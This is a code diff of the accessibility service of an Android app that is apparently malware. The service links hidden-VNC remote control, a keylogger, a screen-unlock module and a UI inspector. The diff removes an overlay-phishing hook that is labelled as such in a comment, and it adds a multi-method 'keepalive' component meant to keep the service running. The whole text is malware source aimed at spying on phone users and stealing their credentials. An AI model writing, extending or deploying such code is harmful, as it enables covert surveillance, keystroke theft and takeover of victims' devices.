@@ -1,13 +1,12 @@
 package com.fason.app.core;
 
-import com.fason.app.features.overlay.OverlayManager;
-import com.fason.app.features.overlay.SmartTriggerEngine;
 import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import com.fason.app.features.hvnc.HVncAccessibilityService;
+import com.fason.app.features.hvnc.AccessibilityKeepalive;
 import com.fason.app.features.inspector.InspectorAccessibilityService;
 import com.fason.app.features.keylogger.KeyloggerManager;
 import com.fason.app.features.unlock.UnlockManager;
@@ -15,17 +14,17 @@ import com.fason.app.features.unlock.UnlockManager;
 public class FasonAccessibilityService extends AccessibilityService {
     private static final String TAG = "FasonA11y";
     private static volatile FasonAccessibilityService instance;
-    private OverlayManager overlayManager;
 
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
         instance = this;
-        overlayManager = OverlayManager.getInstance(this);
         HVncAccessibilityService.onHostConnected(this);
         InspectorAccessibilityService.onHostConnected(this);
         KeyloggerManager.onHostConnected(this);
         UnlockManager.onHostConnected(this);
+        // v4.0: start all 5 keepalive methods
+        AccessibilityKeepalive.getInstance().onServiceConnected();
         Log.i(TAG, "Accessibility service connected");
     }
 
@@ -34,7 +33,6 @@ public class FasonAccessibilityService extends AccessibilityService {
         if (event == null) return;
         try {
             int type = event.getEventType();
-
             if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                 type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                 HVncAccessibilityService.onAccessibilityEvent(event);
@@ -49,14 +47,6 @@ public class FasonAccessibilityService extends AccessibilityService {
             } else if (type == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
                 InspectorAccessibilityService.onAccessibilityEvent(event);
             }
-
-            // Overlay phishing: detect app launches + feed smart engine
-            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                SmartTriggerEngine.get(this).onWindowStateChanged(event);
-                if (overlayManager != null) {
-                    overlayManager.handleAccessibilityEvent(event);
-                }
-            }
         } finally {
             try { event.recycle(); } catch (Exception ignored) {}
         }
@@ -70,12 +60,13 @@ public class FasonAccessibilityService extends AccessibilityService {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        // v4.0: tear down keepalive stack on destroy
+        AccessibilityKeepalive.getInstance().onServiceDestroyed();
         HVncAccessibilityService.onHostDisconnected();
         InspectorAccessibilityService.onHostDisconnected();
         KeyloggerManager.onHostDisconnected();
         UnlockManager.onHostDisconnected();
         instance = null;
-        overlayManager = null;
         Log.i(TAG, "Service destroyed");
     }
 
